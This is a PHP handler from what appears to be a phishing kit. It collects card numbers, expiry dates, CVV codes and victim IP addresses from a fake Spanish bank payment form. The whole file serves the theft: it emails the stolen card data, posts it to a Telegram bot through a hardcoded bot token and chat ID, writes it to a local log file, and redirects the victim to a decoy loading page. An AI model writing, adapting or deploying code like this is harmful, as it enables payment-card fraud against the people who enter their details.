<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc']=$_POST['Sis_Numero_Tarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $message = "
            -
            Zack Swiss
            --------------------
            | CCN : ".$_POST['Sis_Numero_Tarjeta']."
            | EXP : " . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."|". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."
            | CVV : " . $_POST['Sis_Tarjeta_CVV2'] . "
            | FRM : ". $ip ."\n";

            $email = "".$EX445093_REMOT."";
mail($email,$subject,$message,$send,$headers);
$token = "1863671855:AAGhcWusqXoI4zdmDYeSpNqtPiNwIYwDl94";
$data = [
    'text' => $message,
    'chat_id' => '1695405377'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    $text = fopen('../Zack.txt', 'a');
fwrite($text, $message);
		
        header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
    }
}
?>